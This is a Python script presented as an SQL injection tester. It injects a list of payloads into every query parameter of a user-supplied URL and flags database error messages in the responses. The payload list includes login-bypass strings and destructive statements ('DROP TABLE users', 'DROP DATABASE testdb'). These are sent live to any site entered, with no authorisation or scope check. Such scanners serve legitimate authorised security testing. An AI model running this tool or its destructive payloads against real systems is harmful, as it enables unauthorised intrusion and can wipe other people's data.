# SQL Injection Tester
# Author: Ryan Feneley
# Date: September 2024

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Common SQL injection payloads. can add more
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 #",
    "' OR '1'='2",
    "' AND 'x'='x",
    "' AND 'x'='y",
    "'; DROP TABLE users --",
    "'; DROP DATABASE testdb --",
    "'; SELECT * FROM users WHERE 'a'='a",
]

def is_vulnerable(response):
    """ Check if a response is likely vulnerable by searching for SQL error messages or anomalous behavior. """
    error_messages = [
        "you have an error in your sql syntax",  # MySQL
        "unclosed quotation mark",               # SQL Server
        "quoted string not properly terminated", # Oracle
        "SQL error",                             # General SQL error
        "ORA-",                                  # Oracle error
        "mysql_fetch",                           # PHP MySQL fetch errors
        "supplied argument is not a valid MySQL result",  # PHP MySQL error
    ]
    for error in error_messages:
        if error.lower() in response.text.lower():
            return True
    return False

def test_sql_injection(url):
    """ Test for SQL injection vulnerability by injecting SQL payloads into URL parameters. """
    
    # Parse the URL
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:
        print("No parameters found in URL. Please provide a URL with query parameters to test.")
        return
    
    print(f"Testing URL: {url}")
    
    # Test each parameter for SQL injection vulnerability
    for param in query_params:
        original_value = query_params[param][0]
        
        for payload in SQL_PAYLOADS:
            # Inject SQL payload into the parameter
            query_params[param] = original_value + payload
            injected_query = urlencode(query_params, doseq=True)
            
            injected_url = urlunparse(
                (parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, injected_query, parsed_url.fragment)
            )
            
            try:
                response = requests.get(injected_url, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f"Error testing {injected_url}: {e}")
                continue
            
            # Check if the response indicates a potential SQL injection vulnerability
            if is_vulnerable(response):
                print(f"Potential SQL Injection vulnerability found with payload: {payload}")
                print(f"Injected URL: {injected_url}")
                return
        # Reset the parameter to its original value after each test
        query_params[param] = original_value
    
    print("No SQL Injection vulnerabilities found.")

if __name__ == "__main__":
    url = input("Enter the URL to test for SQL Injection vulnerabilities (with parameters): ")
    if not url.startswith("http://") and not url.startswith("https://"):
        print("Please provide a valid URL that starts with 'http://' or 'https://'")
    else:
        # Start testing the URL for SQL Injection
        test_sql_injection(url)
